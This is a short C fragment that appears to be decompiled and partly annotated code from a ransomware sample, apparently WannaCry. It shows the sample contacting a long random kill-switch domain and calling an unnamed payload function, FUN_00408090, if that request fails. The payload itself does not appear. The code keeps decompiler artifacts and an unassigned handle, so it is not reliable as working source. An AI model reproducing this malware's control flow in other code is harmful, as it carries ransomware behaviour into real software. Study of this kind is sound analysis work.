#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

char weird_url[] = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";


int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nShowCmd)
{
  HINTERNET hInternet;
  HINTERNET internet_open_url_HANDLE;
  int iVar1;
  char *werid_url_cp;
  undefined4 *weird_url_cpy2;
  undefined4 local_50 [14];
  undefined4 local_17;
  undefined4 local_13;
  undefined4 local_f;
  undefined4 local_b;
  undefined4 local_7;
  undefined2 local_3;
  undefined local_1;
  
  iVar1 = 14;
  werid_url_cp = weird_url;
  weird_url_cpy2 = local_50;
  
  strcpy( weird_url_cpy2 , weird_url_cp );
  
  *(char *)weird_url_cpy2 = *werid_url_cp;
  
  local_17 = 0;
  local_13 = 0;
  local_f = 0;
  local_b = 0;
  local_7 = 0;
  local_3 = 0;
  local_1 = 0;
  
  InternetOpenA((LPCSTR)0x0,1,(LPCSTR)0x0,(LPCSTR)0x0,0);
  internet_open_url_HANDLE = InternetOpenUrlA(hInternet,(LPCSTR)local_50,(LPCSTR)0x0,0,2214592512,0)
  ;
                    /* if it fails... */
  if (internet_open_url_HANDLE == (HINTERNET)0x0) {
    InternetCloseHandle(hInternet);
    InternetCloseHandle(0);
    FUN_00408090();
                    /* else, connect, and do nothing */
    return 0;
  }
  InternetCloseHandle(hInternet);
  InternetCloseHandle(internet_open_url_HANDLE);
  return 0;
}
